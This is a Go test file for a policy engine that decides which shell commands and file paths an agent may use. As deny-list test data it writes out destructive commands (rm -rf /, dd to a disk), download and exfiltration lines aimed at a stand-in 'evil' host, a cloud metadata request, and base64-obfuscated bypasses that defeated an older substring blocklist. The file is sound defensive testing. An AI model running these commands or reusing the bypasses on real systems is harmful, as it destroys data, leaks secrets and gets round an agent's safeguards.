package policy

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestCommandDenied(t *testing.T) {
	e := New(Config{})
	deny := []struct{ cmd, rule string }{
		{"rm -rf /", "no_destroy"},
		{"rm -rf /sdcard", "no_destroy"},
		{"dd if=/dev/zero of=/dev/sda", "no_destroy"},
		{"mkfs.ext4 /dev/block", "no_destroy"},
		{"kill -9 1", "no_autonomy_destructive"},
		{"reboot", "no_autonomy_destructive"},
		{"curl http://evil/x", "no_exfiltrate"},
		{"wget http://evil/x", "no_exfiltrate"},
		{"scp secret@host:/tmp", "no_exfiltrate"},
	}
	for _, tc := range deny {
		d := e.CheckCommand(tc.cmd)
		if d.Allowed {
			t.Errorf("CheckCommand(%q) = ALLOWED, want denied (%s)", tc.cmd, tc.rule)
			continue
		}
		if d.Rule != tc.rule {
			t.Errorf("CheckCommand(%q).Rule = %q, want %q", tc.cmd, d.Rule, tc.rule)
		}
	}
}

// TestOldBlocklistBypassesAreNowDenied reproduces, verbatim, the bypasses that
// defeated vercel-leg/utils/termux_executor.py's substring blocklist. That
// blocklist also lived in the cloud client, so none of these were even
// consulted for a direct POST to the tunnel. Enforcement is server-side now.
func TestOldBlocklistBypassesAreNowDenied(t *testing.T) {
	e := New(Config{})
	bypasses := []string{
		`$(echo cm0gLXJmIC8= | base64 -d)`,
		`python -c "import urllib.request,os;urllib.request.urlretrieve('http://evil/x','/data/data/com.termux/files/home/x')"`,
		`sh -c "$(printf cm0gLXJmIC8=)"`,
		`python3 -c "import os;os.system('rm -rf /sdcard')"`,
		"rm -rf /sdcard",
		`echo hi | sh`,
		"wget http://evil/x",
		"curl http://169.254.169.254/latest/meta-data/",
	}
	for _, c := range bypasses {
		if d := e.CheckCommand(c); d.Allowed {
			t.Errorf("old-blocklist bypass now ALLOWED: %q", c)
		}
	}
}

// TestSubstringFalsePositivesStillAllowed guards against the opposite failure:
// a blocklist that refuses ordinary work. The TypeScript guard already had to
// fix this for "skill"/"kill" and "python"/"pin"; keep the same discipline.
func TestSubstringFalsePositivesStillAllowed(t *testing.T) {
	e := New(Config{})
	ok := []string{
		"ls -la",
		"echo hello",
		"cat notes.txt",
		"git status",
		"python3 --version", // "python" contains "pin"? no; but check anyway
		"show me my skill level",
		"npm run build",
		"df -h",
	}
	for _, c := range ok {
		if d := e.CheckCommand(c); !d.Allowed {
			t.Errorf("CheckCommand(%q) denied (%s: %s) but is ordinary work",
				c, d.Rule, d.Reason)
		}
	}
}

func TestNetworkRequiresExplicitOptIn(t *testing.T) {
	strict := New(Config{})
	if strict.CheckCommand("curl http://x").Allowed {
		t.Fatal("network tool allowed without AllowNetwork")
	}
	permissive := New(Config{AllowNetwork: true})
	if d := permissive.CheckCommand("curl http://x"); !d.Allowed {
		t.Fatalf("network tool denied despite AllowNetwork: %s", d.Reason)
	}
	// AllowNetwork must not unlock destructive verbs.
	if permissive.CheckCommand("rm -rf /").Allowed {
		t.Fatal("AllowNetwork must not permit rm -rf /")
	}
}

func TestWriteRequiresExplicitOptIn(t *testing.T) {
	ro := New(Config{})
	if d := ro.CheckCommand("tee /tmp/x"); d.Allowed {
		t.Fatal("mutating command allowed in read-only mode")
	}
	rw := New(Config{AllowWrite: true})
	if d := rw.CheckCommand("tee /tmp/x"); !d.Allowed {
		t.Fatalf("tee denied with AllowWrite: %s", d.Reason)
	}
}

func TestPathDeniedWithoutRoots(t *testing.T) {
	// Fail-closed: an agent with no configured boundary has no boundary.
	e := New(Config{})
	if _, d := e.CheckPath("/etc/passwd"); d.Allowed {
		t.Fatal("path access allowed with zero roots configured")
	}
}

func TestPathAllowedInsideRootAndDeniedOutside(t *testing.T) {
	root := t.TempDir()
	inside := filepath.Join(root, "sub", "file.txt")
	if err := os.MkdirAll(filepath.Dir(inside), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(inside, []byte("x"), 0o600); err != nil {
		t.Fatal(err)
	}

	e := New(Config{Roots: []string{root}, AllowWrite: true})

	if _, d := e.CheckPath(inside); !d.Allowed {
		t.Fatalf("path inside root denied: %s", d.Reason)
	}
	for _, out := range []string{
		"/etc/passwd",
		filepath.Join(root, "..", "escape.txt"),
		filepath.Join(root, "sub", "..", "..", "escape.txt"),
		"/",
	} {
		if _, d := e.CheckPath(out); d.Allowed {
			t.Errorf("path outside root ALLOWED: %q", out)
		}
	}
}

func TestPathTraversalViaDotDotIsDenied(t *testing.T) {
	root := t.TempDir()
	e := New(Config{Roots: []string{root}, AllowWrite: true})
	// root is like /tmp/TestXxx/001 ; climbing out must not be permitted.
	escape := filepath.Join(root, "..", "..", "..", "etc", "passwd")
	if _, d := e.CheckPath(escape); d.Allowed {
		t.Fatalf("traversal ALLOWED: %q", escape)
	}
}

func TestSymlinkCannotEscapeRoot(t *testing.T) {
	root := t.TempDir()
	outside := t.TempDir()
	secret := filepath.Join(outside, "secret.txt")
	if err := os.WriteFile(secret, []byte("TOPSECRET"), 0o600); err != nil {
		t.Fatal(err)
	}
	link := filepath.Join(root, "innocent.txt")
	if err := os.Symlink(secret, link); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}

	e := New(Config{Roots: []string{root}})
	if _, d := e.CheckPath(link); d.Allowed {
		t.Fatal("symlink pointing outside the root was ALLOWED")
	}
}

func TestEmptyInputs(t *testing.T) {
	e := New(Config{Roots: []string{t.TempDir()}})
	if e.CheckCommand("   ").Allowed {
		t.Error("blank command allowed")
	}
	if _, d := e.CheckPath(""); d.Allowed {
		t.Error("empty path allowed")
	}
}

func TestReasonIsPopulatedOnDeny(t *testing.T) {
	e := New(Config{})
	d := e.CheckCommand("rm -rf /")
	if strings.TrimSpace(d.Reason) == "" {
		t.Error("deny has no reason: it must be loggable/returnable")
	}
}
